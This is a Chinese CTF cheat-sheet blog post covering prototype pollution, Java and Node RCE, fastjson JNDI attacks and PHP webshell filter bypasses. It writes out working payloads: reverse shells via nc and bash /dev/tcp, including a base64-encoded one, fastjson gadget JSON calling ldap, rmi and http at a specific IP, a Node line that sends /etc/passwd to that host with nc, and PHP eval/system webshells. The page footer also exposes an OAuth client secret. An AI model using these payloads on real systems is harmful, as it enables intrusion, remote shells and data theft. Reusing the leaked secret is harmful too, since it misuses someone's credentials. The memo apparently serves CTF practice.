<p>而所有的数据类型，最终的原型(prototype)都是Object.prototype，你也可以理解为数组/函数/xxx/这些数据类型都继承自类的原型，类是爸爸级别的。</p>
<pre><code>Array/Function.prototype.__proto__ == Object.prototype
&gt;true</code></pre><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a>proto</h3><p>这个就很简单了，每个数据类型里都有一个<code>__proto__</code>属性，指向自己的原型<code>prototype</code></p>
<h2 id="污染思路"><a href="#污染思路" class="headerlink" title="污染思路"></a>污染思路</h2><p>大部分原型链污染的题目就是利用某个对象的__proto__去向上指定原型，一直找到<code>Object</code>，一旦可以污染到<code>Object</code>的xxx属性，就可以修改任何对象的xxx属性。</p>
<p>如果是一个已经被定义的变量，它无法被原型链污染。</p>
<p>这里举一个Array.prototype被污染的情况如下：<br><img src="http://static.zybuluo.com/1160307775/mbmemb110lhvmtd9gh6kxe8f/image_1dma76hhhtag18hj2ku1s43st3m.png" alt="image_1dma76hhhtag18hj2ku1s43st3m.png-28.6kB"></p>
<h3 id="loadsh库-lt-4-17-5的污染"><a href="#loadsh库-lt-4-17-5的污染" class="headerlink" title="loadsh库&lt;4.17.5的污染"></a>loadsh库&lt;4.17.5的污染</h3><p>payload如下</p>
<pre><code>const mergeFn = require(&#39;lodash&#39;).defaultsDeep;
const payload = &#39;{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;a0&quot;: true}}}&#39;

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[&#39;a0&#39;] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();</code></pre><p>这个payload就相当于污染了Object.prototype.a0属性<br><img src="http://static.zybuluo.com/1160307775/yw8yzubquiat16kuza8uso6s/image_1dtben43n1ab92ab1bml19k1hvlm.png" alt="image_1dtben43n1ab92ab1bml19k1hvlm.png-21.9kB"></p>
<h3 id="JQuery-extend"><a href="#JQuery-extend" class="headerlink" title="JQuery-$.extend()"></a>JQuery-$.extend()</h3><p>JQuery 是一个非常流行的Js前端工具库，而它也存在原型链污染漏洞，CVE：CVE-2019-11358， 版本小于3.4.0时</p>
<p><img src="http://static.zybuluo.com/1160307775/ey9p1cv9e48igzla24c4odu8/image_1dtbf900dc9g109k1iev8ebfm41j.png" alt="image_1dtbf900dc9g109k1iev8ebfm41j.png-11.6kB"></p>
<p>可以看到，<code>$.extend(true,{},JSON.parse(&#39;{&quot;__proto__&quot;:{&quot;aa&quot;:&quot;hello&quot;}}&#39;))</code> Jquery可以用$.extend将两个字典merge，而这也因此污染了原型链。</p>
<h3 id="ejs和jade的RCE"><a href="#ejs和jade的RCE" class="headerlink" title="ejs和jade的RCE"></a>ejs和jade的RCE</h3><p>都是在exports.compile，即编译模版时候产生的代码注入</p>
<p>以jade模版为例，首先通过parse()函数获取一个变量作为函数内容，之后呢把它赋值到fn中，通过建立一个构造方法<code>Function</code>把fn数组重新赋值为一个新的函数体<code>fn</code>，之后调用return fn来动态执行原来fn中的字符串(相当于一个编译过程)</p>
<p>所以只要fn中存在恶意代码就可以在创建构造函数的时候把代码执行了<br><img src="http://static.zybuluo.com/1160307775/hk916tks6fy0dqn1p88pm6ne/image_1dtbhnc4t1eju1pi875c16a3d5d20.png" alt="image_1dtbhnc4t1eju1pi875c16a3d5d20.png-217.7kB"></p>
<p>所以跟进parse找污染点。一步一步入栈，栈的最深处visit函数存在原型链污染点，line默认未定义，只要污染line为:<code>));global.process.mainModule.require(&#39;child_process&#39;).execSy
nc(&#39;nc vps -e /bin/sh&#39;);//</code>即可</p>
<p><img src="http://static.zybuluo.com/1160307775/ncrd9wo2aqnra2b1jkn6swfn/image_1dtbhutuu7ug14iog7t12b6hh32t.png" alt="image_1dtbhutuu7ug14iog7t12b6hh32t.png-119.9kB"></p>
<p>关于ejs的RCE+污染点分析，见：</p>
<p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">Express+lodash+ejs: 从原型链污染到RCE</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">XNUCA2019 Hardjs题解 从原型链污染到RCE</a></p>
<h3 id="不需要原型链污染的ejs-rce"><a href="#不需要原型链污染的ejs-rce" class="headerlink" title="不需要原型链污染的ejs-rce"></a>不需要原型链污染的ejs-rce</h3><p>前提是将<code>req.body</code>作为ejs渲染的参数，因为express存在hpp，所以这样就相当于污染了<code>options</code>，从而污染一个<code>options.settings</code>，这样就不需要原型链。。不过一般没有那个sb会这样写ejs的渲染出了ctfer</p>
<p><img src="http://static.zybuluo.com/1160307775/t0d100moorci4vyxni1b1xyy/image_1dvm51g2cbdhepm121j1jl1eoj3p.png" alt="image_1dvm51g2cbdhepm121j1jl1eoj3p.png-15.4kB"></p>
<p>详情见国外的一道ctf：<a href="https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo" target="_blank" rel="noopener">https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo</a></p>
<h2 id="express框架"><a href="#express框架" class="headerlink" title="express框架"></a>express框架</h2><p>express框架存在hpp，也就是说传入这样的参数</p>
<pre><code>aa[name]=hpdoger</code></pre><p>会被解析成为对象<code>{aa:{name:&quot;hpdoger&quot;}}</code>，这是因为express原生处理请求使用的是qs模块，而qs模块不存在原型链污染的问题，所以不能污染_<em>proto_</em></p>
<h1 id="Javaweb"><a href="#Javaweb" class="headerlink" title="Javaweb"></a>Javaweb</h1><h2 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h2><p>Runtime.getRuntime().exec()是Java中执行系统命令的方法，该接口中不能使用管道符等bash需要的方法，需要对bash进行一次编码：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a>  </p>
<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8888 0&gt;&amp;1  </p>
<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}</p>
<h2 id="fastjson攻击"><a href="#fastjson攻击" class="headerlink" title="fastjson攻击"></a>fastjson攻击</h2><p>看这个，原理分析的很到位:<a href="https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/" target="_blank" rel="noopener">fastjson 1.2.61远程代码执行漏洞分析&amp;复现</a></p>
<p>具体的一个例子参见空指针wp:<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a></p>
<h3 id="攻击的两种方式"><a href="#攻击的两种方式" class="headerlink" title="攻击的两种方式"></a>攻击的两种方式</h3><p><strong>1、jdk低版本，允许加载远程恶意类</strong></p>
<p>攻击者在服务端用<a href="https://github.com/mbechler/marshalsec/tree/0471b932a09c8aca21876de80c8abf65b251c9ca" target="_blank" rel="noopener">marshalsec</a>起一个rmi/ldap的server，用来接收受害者请求并且转发到我们自己构造的http服务，下载&amp;加载恶意类(用来RCE的类)，例子在:<a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/" target="_blank" rel="noopener">FastJson 反序列化漏洞利用笔记</a></p>
<p>然后发送一个fastjson的poc到我们的rmi/ldap server就行了<br><a href="https://github.com/jas502n/fastjson-1.2.61-RCE" target="_blank" rel="noopener">fastjson-1.2.61-RCE</a></p>
<p><strong>2、jdk高版本，需要找到另外库的反序列化链来用</strong></p>
<p>188以后的版本，不允许加载远程的恶意类，也就是说请求不到我们http-server下面放置的恶意类。此时有两种方法:</p>
<p>1.用ldap+本地gadget来bypass:<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>
<p>2.用jrmp+rmi来bypass:攻击者用yso本地建立一个rmi-server，然后利用其他依赖的反序列化中继，具体用法见:<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a><br><img src="http://static.zybuluo.com/1160307775/ozohcfzy5fh830z7oa86dlzn/image_1dtl011jf1tdlnpnvd9jmg1nvh2p.png" alt="image_1dtl011jf1tdlnpnvd9jmg1nvh2p.png-24.7kB"></p>
<h3 id="挖洞利用"><a href="#挖洞利用" class="headerlink" title="挖洞利用"></a>挖洞利用</h3><p>遇到传输格式是json的，就可以本地nc监听一个端口<code>1389</code>看有没有收到请求，用poc去打一下，推荐用1.2.61的poc去打，这个比较接近于最新版</p>
<pre><code>{&quot;@type&quot;:&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://120.79.152.66:1389/ExportObject&quot;}

{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://120.79.152.66:1389/Object&quot;,&quot;autoCommit&quot;:true}

{&quot;@type&quot;:&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://120.79.152.66:1389/inject.sql&#39;&quot;}</code></pre><h1 id="NodeJS相关"><a href="#NodeJS相关" class="headerlink" title="NodeJS相关"></a>NodeJS相关</h1><h2 id="快速启动express框架"><a href="#快速启动express框架" class="headerlink" title="快速启动express框架"></a>快速启动express框架</h2><p>全局安装express<code>npm install express -gd</code></p>
<p>直接用<code>express project</code>就能启动项目</p>
<p><img src="http://static.zybuluo.com/1160307775/ztst1w1ee9pg18twtl3kok8o/image_1dus0g9591jm238q1tgd14cu2cl9.png" alt="image_1dus0g9591jm238q1tgd14cu2cl9.png-435.1kB"></p>
<h2 id="npm所有第三方库漏洞"><a href="#npm所有第三方库漏洞" class="headerlink" title="npm所有第三方库漏洞"></a>npm所有第三方库漏洞</h2><p><a href="https://snyk.io/vuln/?type=npm" target="_blank" rel="noopener">https://snyk.io/vuln/?type=npm</a></p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><pre><code>&gt; var test = &#39;hpdoger&#39;;

&gt; var cookie = `aaa${test}`;

&gt; console.log(cookie);
aaahpdoger</code></pre><h2 id="url-parse绕过"><a href="#url-parse绕过" class="headerlink" title="url_parse绕过"></a>url_parse绕过</h2><p>对于白名单的绕过，又有新洞了，针对url_parse()函数:<a href="https://hackerone.com/reports/678487" target="_blank" rel="noopener">Hostname spoofing</a></p>
<h2 id="查看依赖的漏洞"><a href="#查看依赖的漏洞" class="headerlink" title="查看依赖的漏洞"></a>查看依赖的漏洞</h2><p>拿到一个nodejs项目的源码进行审计，第一步便是运行<code>npm audit</code> ，可以看到依赖项的漏洞情况。在项目的文件夹下直接运行<code>npm audit</code>就行了</p>
<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png" alt></p>
<h2 id="RCE语句"><a href="#RCE语句" class="headerlink" title="RCE语句"></a>RCE语句</h2><pre><code>require(&#39;child_process&#39;).exec(&#39;cat+/etc/passwd+|+nc+120.79.152.66+80&#39;)</code></pre><h2 id="nodemon-node的debug模式"><a href="#nodemon-node的debug模式" class="headerlink" title="nodemon-node的debug模式"></a>nodemon-node的debug模式</h2><h1 id="综合题型"><a href="#综合题型" class="headerlink" title="综合题型"></a>综合题型</h1><h2 id="http请求走私"><a href="#http请求走私" class="headerlink" title="http请求走私"></a>http请求走私</h2><p><img src="http://static.zybuluo.com/1160307775/bdyqii5y4vomhk0zdpv847nf/image_1dr102gapo981svc1e4f1s7qo509.png" alt="image_1dr102gapo981svc1e4f1s7qo509.png-379.6kB"></p>
<h2 id="jwt攻击"><a href="#jwt攻击" class="headerlink" title="jwt攻击"></a>jwt攻击</h2><p><a href="https://xz.aliyun.com/t/6776#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776#toc-8</a></p>
<h2 id="python-rce"><a href="#python-rce" class="headerlink" title="python-rce"></a>python-rce</h2><pre><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><h2 id="MYSQL读取客户端文件"><a href="#MYSQL读取客户端文件" class="headerlink" title="MYSQL读取客户端文件"></a>MYSQL读取客户端文件</h2><p>如果对方能够连接任意mysql用户，我们就可以伪造一个server去读取客户端的文件</p>
<p>Rogue-MySql-Server:<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p>
<p>1、有一个更智能的脚本:<a href="https://github.com/lcark/MysqlClientAttack" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack</a></p>
<p>2、针对ctf的脚本:<a href="https://github.com/ev0A/Mysqlist" target="_blank" rel="noopener">https://github.com/ev0A/Mysqlist</a></p>
<h2 id="进程文件proc"><a href="#进程文件proc" class="headerlink" title="进程文件proc"></a>进程文件proc</h2><p>proc是一个文件夹，每个进程都代表一个文件夹</p>
<h3 id="常见的进程文件"><a href="#常见的进程文件" class="headerlink" title="常见的进程文件"></a>常见的进程文件</h3><pre><code>
/proc/self 链接到当前正在运行的进程

/proc/N/cwd 链接到进程当前工作目录

如果是通过小马执行的程序，那么当前进程就是apache，组合一下self/cwd:
proc/self/cwd/     =&gt;apache的工作目录

proc/pid/cmdline   =&gt;里面存储某个进程初始运行的命令,即启动时传递给kernel的参数信息</code></pre><h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><h3 id="绕过尖括号"><a href="#绕过尖括号" class="headerlink" title="绕过尖括号"></a>绕过尖括号</h3><p>这种必须能修改.htaccess或者.user.ini文件，为每个文件包含一个php伪协议</p>
<p>利用方式:<a href="https://xz.aliyun.com/t/3937#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937#toc-3</a></p>
<h3 id="绕过问号限制"><a href="#绕过问号限制" class="headerlink" title="绕过问号限制"></a>绕过问号限制</h3><p>php小于7.0的可以通过</p>
<pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><h3 id="绕过php标签限制"><a href="#绕过php标签限制" class="headerlink" title="绕过php标签限制"></a>绕过php标签限制</h3><p>或者使用短标签</p>
<pre><code>&lt;?=eval($_GET[1]);?&gt;</code></pre><h3 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h3><pre><code>1、没有过滤括号
$_GET[1]($_GET[0]);

2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来
$_GET{1}($_GET{0});</code></pre><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="异或getshell"><a href="#异或getshell" class="headerlink" title="异或getshell"></a>异或getshell</h3><p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">一道题回顾php异或webshell</a></p>
<h3 id="取反getshell"><a href="#取反getshell" class="headerlink" title="取反getshell"></a>取反getshell</h3><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p>
<p><img src="http://static.zybuluo.com/1160307775/79i3ts2ckb7pt2sadlxjxts0/image_1dn25ak6j4qopumrdjtv8mic9.png" alt="image_1dn25ak6j4qopumrdjtv8mic9.png-117.8kB"></p>
<p>生成规则:</p>
<pre><code>var_dump(urlencode(~&#39;phpinfo&#39;));

=&gt;%8F%97%8F%96%91%99%90</code></pre>
            </div>
          
           
            <div class="copyright">
                <div class="name">
                    <a>Author:</a>
                    <a>Hpdoger</a>
                </div>
                <div class="link">
                    <a>Link:</a>
                    <a class="permalink" href="https://hpdoger.cn/2025/01/04/My CTF Memo(持续更新)/">https://hpdoger.cn/2025/01/04/My CTF Memo(持续更新)/</a>
                </div>
                <div class="license">
                    <a>Statement:</a>
                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                </div>
            </div>
            

          


</article>


<div class="tip">
<button class="tip-btn">
    Tip
</button>
<div class="tip-img">
<ul>
    
 
<li>
    <img src="/img/wechat.jpg">
</li>

</ul>
</div>
</div>

<div class="more">

<div></div>

    <div class="next">
    <a href="/2025/01/03/Node的一些应用技巧(持续更新)/"> Node的一些应用技巧(持续更新) </a>
    </div>
    
</div>

<div class="bdsharebuttonbox">
<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
</a>
<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
</a>
<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
</a>
<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
</a>
</div>
<script>
window._bd_share_config={
    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script>
 
<div id="comments"></div>

<script>
    var gitment = new Gitment({
    id: "Sat Jan 04 2025 00:00:00 GMT+0800",
    owner: "Hpd0ger",
    repo: "Hpd0ger.github.io",
    oauth: {
      client_id:"8d83609a651e972e308d",
      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
    }
  })
  gitment.render('comments')
</script>
    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>